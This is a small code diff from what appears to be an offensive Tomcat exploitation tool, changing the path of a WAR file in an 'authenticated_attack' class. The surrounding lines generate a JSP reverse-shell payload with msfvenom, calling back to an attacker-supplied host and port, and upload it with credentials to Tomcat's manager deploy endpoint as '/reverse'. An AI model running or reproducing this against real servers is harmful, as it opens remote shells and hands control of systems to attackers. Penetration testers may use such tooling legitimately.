@@ -234,7 +234,7 @@ class authenticated_attack(tomcat):
                         ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}",
                          "-f", "war", "-o", f"resources/{filename}.war"], check=True, capture_output=True)
 
-                    command = f"curl --upload-file {filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
+                    command = f"curl --upload-file resources/{filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
                     subprocess.run(command, shell=True, check=True, capture_output=True)
                     output.message(state="success", description="Uploading revershell", clear_before=False)
 
